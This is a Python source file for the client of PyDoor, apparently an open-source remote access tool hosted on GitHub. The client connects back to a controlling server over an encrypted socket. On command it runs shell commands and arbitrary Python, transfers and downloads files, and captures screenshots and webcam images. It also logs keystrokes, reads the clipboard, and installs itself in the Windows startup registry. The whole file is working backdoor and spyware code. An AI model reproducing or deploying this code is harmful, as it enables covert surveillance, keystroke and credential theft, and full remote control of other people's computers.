"""
https://github.com/Y4hL/PyDoor

Author(s): Y4hL

License: [gpl-3.0](https://www.gnu.org/licenses/gpl-3.0.html)
"""
import getpass
import json
import logging
import os
import platform
import shutil
import socket
import subprocess
import sys
import threading
import time
import traceback
from io import BytesIO, StringIO
from pydoc import help
from zipfile import ZipFile

import cv2
import psutil
import pyperclip
import pyscreeze
import requests
from cryptography.fernet import Fernet

if getattr(sys, 'frozen', False):
    CLIENT_PATH = os.path.dirname(sys.executable)
elif __file__:
    CLIENT_PATH = os.path.dirname(os.path.abspath(__file__))

os.chdir(CLIENT_PATH)
LOG = os.path.join(CLIENT_PATH, 'log.log')

if platform.system() == 'Windows':
    import ctypes
    from winreg import OpenKey, CloseKey, SetValueEx, DeleteValue
    from winreg import HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ
    STARTUP_REG_NAME = 'PyDoor'

try:
    from pynput.keyboard import Listener
except ImportError:
    _PYNPUT = False
else:
    _PYNPUT = True

logging.basicConfig(filename=LOG, level=logging.INFO, format='%(asctime)s: %(message)s')
logging.info('Client Started.')


def reverse_readline(filename: str, buf_size: int = 16384) -> str:
    """A generator that returns the lines of a file in reverse order"""

    # Credit: https://stackoverflow.com/a/23646049/10625567

    with open(filename) as file:
        segment = None
        offset = 0
        file.seek(0, os.SEEK_END)
        file_size = remaining_size = file.tell()
        while remaining_size > 0:
            offset = min(file_size, offset + buf_size)
            file.seek(file_size - offset)
            buffer = file.read(min(remaining_size, buf_size))
            remaining_size -= buf_size
            lines = buffer.split('\n')
            if segment is not None:
                if buffer[-1] != '\n':
                    lines[-1] += segment
                else:
                    yield segment
            segment = lines[0]
            for index in range(len(lines) - 1, 0, -1):
                if lines[index]:
                    yield lines[index]
        if segment is not None:
            yield segment


def errors(error: Exception, line: bool = True) -> str:
    """ Error Handler """
    error_class = error.__class__.__name__
    error_msg = f'{error_class}:'
    try:
        error_msg += f' {error.args[0]}'
    except (IndexError, AttributeError):
        pass
    if line:
        try:
            _, _, traceb = sys.exc_info()
            line_number = traceback.extract_tb(traceb)[-1][1]
            error_msg += f' (line {line_number})'
        except Exception:
            pass
    return error_msg


def add_startup() -> list:
    """ Add Client to startup """
    # returns [True/False, None/error]
    if platform.system() != 'Windows':
        return 'Startup feature is only for Windows'
    if getattr(sys, 'frozen', False):
        path = sys.executable
    elif __file__:
        path = os.path.abspath(__file__)
    try:
        key = OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_ALL_ACCESS)
        SetValueEx(key, STARTUP_REG_NAME, 0, REG_SZ, path)
        CloseKey(key)
    except Exception as error:
        logging.error('Error adding client to startup: %s' % errors(error))
        return errors(error)
    logging.info('Adding client to startup successful')


def remove_startup() -> list:
    """ Remove Client from Startup """
    # returns [True/False, None/error]
    if platform.system() != 'Windows':
        return 'Startup feature is only for Windows'
    try:
        key = OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_ALL_ACCESS)
        DeleteValue(key, STARTUP_REG_NAME)
        CloseKey(key)
    except FileNotFoundError:
        # File was never registered.
        # Still returns True, since it's not in startup
        pass
    except WindowsError as error:
        logging.error('Error removing client from startup: %s' % errors(error))
        return errors(error)
    logging.info('Removed Client from Startup')


def kill(pid: int) -> None:
    """ Kill Process by PID """
    logging.info('Killing process with the pid %s and all its children' % str(pid))
    process = psutil.Process(pid)
    for proc in process.children(recursive=True):
        proc.kill()
        logging.debug('killed child with pid %s' % str(proc.pid))
    process.kill()
    logging.debug('killed parent with pid %s' % str(pid))


def onkeyboardevent(event):
    """ On Keyboard Event"""
    logging.info("%s", event)

if _PYNPUT:
    KeyListener = Listener(on_press=onkeyboardevent)
    # Check the state of the keylogger from logs
    if os.path.isfile(LOG):
        for _line in reverse_readline(LOG):
            if 'Started Keylogger' in _line:
                KeyListener.start()
                break
            if 'Stopped Keylogger' in _line:
                break


class Client(object):
    """ Client Object """

    def __init__(self, key: bytes, host: str = '127.0.0.1', port: int = 8000) -> None:
        self.serverhost = host
        self.serverport = port
        self.socket = None
        self.fer = Fernet(key)
        if platform.system() == 'Windows':
            self._pwd = ' & cd'
        else:
            self._pwd = '; pwd'

    def connect(self) -> None:
        """ Connect to a remote socket """
        try:
            self.socket = socket.socket()
            self.socket.connect((self.serverhost, self.serverport))
        except (ConnectionRefusedError, TimeoutError):
            raise
        except Exception as error:
            logging.error(errors(error))
            raise
        logging.info('Connected to server %s:%s' % (self.serverhost, str(self.serverport)))
        try:
            self.socket.send(socket.gethostname().encode())
        except socket.error as error:
            logging.error(errors(error))

    def recvall(self, byteamount: int) -> bytes:
        """ Function to receive n amount of bytes"""
        # returns bytes/None
        data = b''
        while len(data) < byteamount:
            data += self.socket.recv(byteamount - len(data))
        return data

    def receive(self) -> bytes:
        """ Receives Buffer Size and Data from Server Encrypted with AES """
        # returns bytes
        buffer = int(self.socket.recv(2048).decode())
        self.socket.send(b'RECEIVED')
        return self.fer.decrypt(self.recvall(buffer))

    def send(self, data: bytes) -> None:
        """ Sends Buffer Size and Data to Server Encrypted with AES """
        # returns None
        encrypted = self.fer.encrypt(data)
        self.socket.send(f"{len(encrypted)}".encode())
        self.socket.recv(1024)
        self.socket.send(encrypted)

    def send_json(self, data: not bytes) -> None:
        """ Send JSON data to Server """
        self.send(json.dumps(data).encode())

    def send_file(self, file_to_transfer: str, block_size: int = 32768) -> None:
        """ Send file to Server """
        # returns None
        try:
            with open(file_to_transfer, 'rb') as file:
                while True:
                    block = file.read(block_size)
                    if not block:
                        break
                    self.send(block)
                    self.receive()

        except (FileNotFoundError, PermissionError) as error:
            self.send(b'FILE_TRANSFER_ERROR')
            self.receive()
            self.send(errors(error).encode())
            logging.error('Error transferring %s to Server: %s' % (file_to_transfer, errors(error)))
            return

        self.send(b'FILE_TRANSFER_DONE')
        logging.info('Transferred %s to Server', file_to_transfer)

    def receive_file(self, save_as: str) -> None:
        """ Receive File from Server"""
        # returns None

        try:
            with open(save_as, 'wb') as file:
                self.send(b'Successfully opened file')
                while 1:
                    data = self.receive()
                    if data == b'FILE_TRANSFER_DONE':
                        break
                    file.write(data)
                    self.send(b'RECEIVED')

        except (FileNotFoundError, PermissionError) as error:
            self.send(b'FILE_TRANSFER_ERROR')
            self.receive()
            self.send(errors(error).encode())
            logging.error('Error receiving %s from Server: %s' % (save_as, errors(error)))
            return

        self.send(b'File transferred Successfully')
        logging.info('Transferred %s to Client', save_as)

    def receive_commands(self) -> None:
        """ Receives Commands from Server """
        while True:
            data = json.loads(self.receive().decode())

            if data[0] == 'GETCWD':
                self.send(os.getcwdb())
                continue

            if data[0] == 'LIST':
                continue

            if data[0] == 'PLATFORM':
                self.send(platform.system().encode())
                continue

            if data[0] == 'LOG_FILE':
                self.send(LOG.encode())
                continue

            if data[0] == '_INFO':
                self.send_json([platform.system(), os.path.expanduser('~'), getpass.getuser()])
                continue

            if data[0] == 'FROZEN':
                self.send_json(getattr(sys, 'frozen', False))
                continue

            if data[0] == 'EXEC':
                old_stdout = sys.stdout
                redirected_output = sys.stdout = StringIO()
                error = None
                try:
                    exec(data[1])
                except Exception as err:
                    error = errors(err, line=False)
                finally:
                    sys.stdout = old_stdout
                self.send_json([redirected_output.getvalue(), error])
                continue

            if data[0] == 'RESTART_SESSION':
                self.send_json(True)
                logging.info('Restarting session')
                break

            if data[0] == 'CLOSE':
                self.send_json(True)
                logging.info('Closing connection and exiting')
                self.socket.close()
                sys.exit(0)

            if data[0] == 'ADD_STARTUP':
                self.send_json(add_startup())
                continue

            if data[0] == 'REMOVE_STARTUP':
                self.send_json(remove_startup())
                continue

            if data[0] == 'LOCK':
                if platform.system() == 'Windows':
                    self.send_json(True)
                    ctypes.windll.user32.LockWorkStation()
                    logging.info('Locked workstation')
                else:
                    self.send_json(False)
                continue

            if data[0] == 'SHUTDOWN':
                if platform.system() != 'Windows':
                    self.send_json(False)
                    continue
                self.send_json(True)
                logging.info('Shutting down system')
                subprocess.Popen('shutdown /s /t 0', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                time.sleep(5)
                break

            if data[0] == 'RESTART':
                if platform.system() != 'Windows':
                    self.send_json(False)
                    continue
                self.send_json(True)
                logging.info('Restarting system')
                subprocess.Popen('shutdown /r /t 0', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                time.sleep(5)
                break

            if data[0] == 'RECEIVE_FILE':
                self.send_file(data[1])
                continue

            if data[0] == 'SEND_FILE':
                self.receive_file(data[1])
                continue

            if data[0] == 'ZIP_FILE':
                try:
                    with ZipFile(data[1], 'w') as ziph:
                        ziph.write(data[2])
                except Exception as err:
                    logging.error('Error zipping file %s into %s: %s' % (data[2], data[1], errors(error)))
                    self.send_json(errors(err))
                    continue
                logging.info('Zipped file %s into %s' % (data[2], data[1]))
                self.send_json(None)
                continue

            if data[0] == 'ZIP_DIR':
                logging.info('Zipping Folder: %s', data[2])
                try:
                    shutil.make_archive(data[1], 'zip', data[2])
                except Exception as error:
                    logging.error('Error zipping directory %s into %s.zip: %s' % (data[2], data[1], errors(error)))
                    self.send_json(errors(error))
                    continue
                logging.info('Zipped folder %s into %s.zip' % (data[2], data[1]))
                self.send_json(None)
                continue

            if data[0] == 'UNZIP':
                try:
                    with ZipFile(data[1], 'r') as ziph:
                        ziph.extractall()
                except Exception as error:
                    logging.error('Failed unzipping %s: %s' % (data[1], errors(error)))
                    self.send_json(errors(error))
                    continue
                logging.info('Unzipped %s' % data[1])
                self.send_json(None)
                continue

            if data[0] == 'DOWNLOAD':
                try:
                    request = requests.get(data[1])
                    with open(data[2], 'wb') as file:
                        file.write(request.content)
                except Exception as error:
                    logging.error('Error downloading "%s" from %s: %s' % (data[2], data[1], errors(error)))
                    self.send_json(errors(error, line=False))
                    continue
                logging.info('Downloaded "%s" from %s', data[2], data[1])
                self.send_json(None)
                continue

            if data[0] == 'INFO':
                self.send(f'User: {getpass.getuser()}\n' \
                    f'OS: {platform.system()} {platform.release()} ' \
                    f'({platform.platform()}) ({platform.machine()})\n' \
                    f'Frozen (.exe): {getattr(sys, "frozen", False)}\n'.encode())
                continue

            if data[0] == 'SCREENSHOT':
                logging.info('Taking Screenshot')
                try:
                    with BytesIO() as output:
                        img = pyscreeze.screenshot()
                        img.save(output, format='PNG')
                        content = output.getvalue()
                except Exception as error:
                    logging.error('Error taking screenshot: %s' % errors(error))
                    self.send(b'ERROR')
                    self.receive()
                    self.send(errors(err).encode())
                    continue
                self.send(content)
                continue

            if data[0] == 'WEBCAM':
                camera = cv2.VideoCapture(0)
                state, img = camera.read()
                camera.release()
                if state:
                    is_success, arr = cv2.imencode('.png', img)
                    if is_success:
                        logging.info('Captured webcam image')
                        self.send(arr.tobytes())
                        continue
                logging.error('Error capturing webcam')
                self.send(b'ERROR')
                continue

            if data[0] == 'START_KEYLOGGER':
                if not _PYNPUT:
                    logging.error('pynput not found, could not start keylogger')
                    self.send_json(False)
                    continue
                if not KeyListener.running:
                    KeyListener.start()
                    logging.info('Started Keylogger')
                self.send_json(True)
                continue

            if data[0] == 'KEYLOGGER_STATUS':
                if not _PYNPUT or not KeyListener.running:
                    self.send_json(False)
                    continue
                self.send_json(True)
                continue

            if data[0] == 'STOP_KEYLOGGER':
                if not _PYNPUT:
                    self.send_json(False)
                    continue
                if KeyListener.running:
                    logging.info('Stopped Keylogger')
                    KeyListener.stop()
                    threading.Thread.__init__(KeyListener) # re-initialise thread
                self.send_json(True)
                continue

            if data[0] == 'COPY':
                try:
                    pyperclip.copy(data[1])
                except pyperclip.PyperclipException as error:
                    logging.error('Error copying "%s" to clipboard: %s' % (data[1], errors(error)))
                    self.send_json(errors(error))
                    continue
                logging.info('Copied "%s" to clipboard' % data[1])
                self.send_json(None)
                continue

            if data[0] == 'PASTE':
                try:
                    clipboard = pyperclip.paste()
                except pyperclip.PyperclipException as error:
                    logging.error('Could not paste from clipboard: %s' % errors(error))
                    self.send_json([False, errors(error)])
                    continue
                logging.info('Pasted from clipboard')
                self.send_json([True, clipboard])
                continue

            if data[0] == 'SHELL':
                split_command = data[1].split(' ')[0].strip().lower()
                if split_command in ['cd', 'chdir']:
                    process = subprocess.Popen(data[1] + self._pwd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    error = process.stderr.read().decode()
                    if error == '':
                        output = process.stdout.read().decode()
                        # Command should only return one line (cwd)
                        if output.count('\n') > 1:
                            process = subprocess.Popen(data[1], shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                            self.send_json(['ERROR', process.stdout.read().decode()])
                            continue
                        os.chdir(output.strip())
                        self.send_json([os.getcwd()])
                        continue
                    self.send_json(['ERROR', error])
                    continue

                process = subprocess.Popen(data[1], shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                for line in iter(process.stdout.readline, ''):
                    if line == b'':
                        break
                    self.send(line.replace(b'\n', b''))
                    if self.receive() == b'QUIT':
                        kill(process.pid)
                        break
                self.send(process.stderr.read())
                self.receive()
                self.send(b'DONE')
                continue


def main(key: bytes, retry_timer: int = 10) -> None:
    """ Run Client """
    # RETRY_TIMER: Time to wait before trying to reconnect
    client = Client(key)
    logging.info('Starting connection loop')
    while True:
        try:
            client.connect()
        except Exception:
            time.sleep(retry_timer)
        else:
            break
    try:
        client.receive_commands()
    except Exception as error:
        logging.critical(errors(error))


if __name__ == '__main__':

    # Add Client to Startup when Client is run
    # add_startup()
    while True:
        main(b'QWGlyrAv32oSe_iEwo4SuJro_A_SEc_a8ZFk05Lsvkk=')
